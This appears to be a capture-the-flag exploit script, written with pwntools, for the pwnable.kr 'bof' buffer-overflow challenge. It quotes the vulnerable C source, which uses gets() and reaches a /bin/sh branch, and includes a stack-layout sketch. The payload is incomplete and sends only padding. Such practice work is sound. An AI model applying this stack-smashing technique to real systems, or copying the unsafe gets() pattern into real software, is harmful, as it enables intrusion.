from pwn import *

Host = 'pwnable.kr'
Port = 9000

# p = process('./bof')
# p = remote(Host, Port)
p = remote('pwnable.kr', 9000)

# Set Context
context.arch = 'i386'
context.endian = 'little'
context.log_level = 'debug'

# Exploit
exploit = b''
exploit += b'A'*0x2c

p.recvuntil(b'\n')
p.sendline(exploit)
p.recvuntil(b'\n')


''' 
|   overflowme  |  0x20
|      dummy    |  0x08
|      canary   |  0x04
|       SFP     |  
|       RET     |
|   0xdeadbeef  |
'''

'''
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
'''
